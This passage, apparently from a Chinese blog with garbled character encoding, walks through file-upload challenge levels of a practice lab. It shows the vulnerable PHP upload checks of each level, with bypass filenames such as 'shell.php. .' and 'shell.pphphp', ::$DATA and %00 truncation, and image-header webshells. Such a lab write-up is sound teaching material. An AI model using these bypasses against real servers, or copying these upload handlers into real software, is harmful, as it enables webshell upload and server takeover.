class="line">        $file_ext = trim($file_ext); <span class="comment">//é¦–å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿˜æ˜¯é»‘åå•ï¼Œä½†æ˜¯æ²¡æœ‰å¯¹åç¼€åè¿›è¡Œå»<code>::$DATA</code>å¤„ç†ï¼Œåˆ©ç”¨windowsç‰¹æ€§ï¼Œå¯åœ¨åç¼€åä¸­åŠ <code>::$DATA</code>ç»•è¿‡ï¼š</p><h2 id="ç¬¬9å…³-ç‚¹-ç©ºæ ¼-ç‚¹"><a href="#ç¬¬9å…³-ç‚¹-ç©ºæ ¼-ç‚¹" class="headerlink" title="ç¬¬9å…³ ç‚¹+ç©ºæ ¼+ç‚¹"></a>ç¬¬9å…³ ç‚¹+ç©ºæ ¼+ç‚¹</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//é¦–å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é»‘åå•è¿‡æ»¤ï¼Œæ³¨æ„ä¸‹é¢è¿™è¡Œå’Œä¹‹å‰ä¸å¤ªä¸€æ ·ï¼Œè·¯å¾„æ‹¼æ¥çš„æ˜¯å¤„ç†åçš„æ–‡ä»¶å:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$im</span>g_path = UPLOAD_PATH.<span class="string">'/'</span>.<span class="symbol">$file</span>_name;</span><br></pre></td></tr></table></figure><p>åŸç†åŒPass-06ï¼Œä¸Šä¼ æ–‡ä»¶åååŠ ä¸Š<strong>ç‚¹+ç©ºæ ¼+ç‚¹</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">shell</span>.<span class="bash">php. .</span></span><br></pre></td></tr></table></figure><h2 id="ç¬¬10å…³-åµŒå¥—ç»•è¿‡"><a href="#ç¬¬10å…³-åµŒå¥—ç»•è¿‡" class="headerlink" title="ç¬¬10å…³ åµŒå¥—ç»•è¿‡"></a>ç¬¬10å…³ åµŒå¥—ç»•è¿‡</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åªæ˜¯çš„åˆ é™¤ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</span><br></pre></td></tr></table></figure><p>ä»¥åˆ©ç”¨åŒå†™(åµŒå¥—)ç»•è¿‡</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">shell</span>.<span class="bash">pphphp</span></span><br></pre></td></tr></table></figure><h2 id="ç¬¬11å…³-GETå‹00æˆªæ–­"><a href="#ç¬¬11å…³-GETå‹00æˆªæ–­" class="headerlink" title="ç¬¬11å…³ GETå‹00æˆªæ–­"></a>ç¬¬11å…³ GETå‹00æˆªæ–­</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç™½åå•åˆ¤æ–­ï¼Œä½†æ˜¯$img_pathç›´æ¥æ‹¼æ¥:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br></pre></td></tr></table></figure><p>å› æ­¤å¯ä»¥åˆ©ç”¨%00æˆªæ–­ç»•è¿‡ï¼š</p><ul><li>éœ€å…³é—­magic_quotes_gpc</li><li>php ç‰ˆæœ¬&lt;5.3.4</li></ul><h2 id="ç¬¬12å…³-POSTå‹00æˆªæ–­"><a href="#ç¬¬12å…³-POSTå‹00æˆªæ–­" class="headerlink" title="ç¬¬12å…³ POSTå‹00æˆªæ–­"></a>ç¬¬12å…³ POSTå‹00æˆªæ–­</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_POST[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"ä¸Šä¼ å¤±è´¥"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">"åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>save_pathæ˜¯é€šè¿‡postä¼ è¿›æ¥çš„:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$img_path = $_POST[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br></pre></td></tr></table></figure><p>è¿˜æ˜¯åˆ©ç”¨00æˆªæ–­ï¼Œä½†è¿™æ¬¡éœ€è¦åœ¨äºŒè¿›åˆ¶ä¸­è¿›è¡Œä¿®æ”¹ï¼Œå› ä¸ºpostä¸ä¼šåƒgetå¯¹%00è¿›è¡Œè‡ªåŠ¨è§£ç ã€‚</p><h2 id="ç¬¬13å…³-å›¾é©¬"><a href="#ç¬¬13å…³-å›¾é©¬" class="headerlink" title="ç¬¬13å…³ å›¾é©¬"></a>ç¬¬13å…³ å›¾é©¬</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $file = fopen($filename, <span class="string">"rb"</span>);</span><br><span class="line">    $bin = fread($file, <span class="number">2</span>); <span class="comment">//åªè¯»2å­—èŠ‚</span></span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">"C2chars"</span>, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[<span class="string">'chars1'</span>].$strInfo[<span class="string">'chars2'</span>]);    </span><br><span class="line">    $fileType = <span class="string">''</span>;    </span><br><span class="line">    <span class="keyword">switch</span>($typeCode)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            $fileType = <span class="string">'jpg'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            $fileType = <span class="string">'png'</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            $fileType = <span class="string">'gif'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            $fileType = <span class="string">'unknown'</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> $fileType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_type = getReailFileType($temp_file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($file_type == <span class="string">'unknown'</span>)&#123;</span><br><span class="line">        $msg = <span class="string">"æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_type;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"ä¸Šä¼ å‡ºé”™ï¼"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>getReailFileTypeå‡½æ•°åªä¼šè¯»å–æ–‡ä»¶çš„å‰ä¸¤ä¸ªå­—èŠ‚:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$file = fopen($filename, <span class="string">"rb"</span>);</span><br><span class="line">$bin = fread($file, <span class="number">2</span>); <span class="comment">//åªè¯»2å­—èŠ‚</span></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬ä¼ªé€ ä¸€ä¸ªæ–‡ä»¶å¤´å³å¯ï¼Œä½¿ç”¨å›¾é©¬å¯ä»¥è½»æ¾ç»•è¿‡ã€‚åˆ©ç”¨çš„è¯ï¼Œè¿˜éœ€è¦ç»“åˆæ–‡ä»¶åŒ…å«æ¼æ´ã€‚</p><h2 id="ç¬¬14å…³-getimagesize"><a href="#ç¬¬14å…³-getimagesize" class="headerlink" title="ç¬¬14å…³ getimagesize"></a>ç¬¬14å…³ getimagesize</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $types = <span class="string">'.jpeg|.png|.gif'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos($types,$ext)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> $ext;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"ä¸Šä¼ å‡ºé”™ï¼"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ ¡éªŒäº†æ–‡ä»¶å¤´ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$info = getimagesize($filename);</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨å›¾ç‰‡é©¬å°±å¯è¿›è¡Œç»•è¿‡</p><h2 id="ç¬¬15å…³-exif-imagetype"><a href="#ç¬¬15å…³-exif-imagetype" class="headerlink" title="ç¬¬15å…³ exif_imagetype"></a>ç¬¬15å…³ exif_imagetype</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    <span class="comment">//éœ€è¦å¼€å¯php_exifæ¨¡å—</span></span><br><span class="line">    $image_type = exif_imagetype($filename);</span><br><span class="line">    <span class="keyword">switch</span> ($image_type) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"gif"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"jpg"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"png"</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span 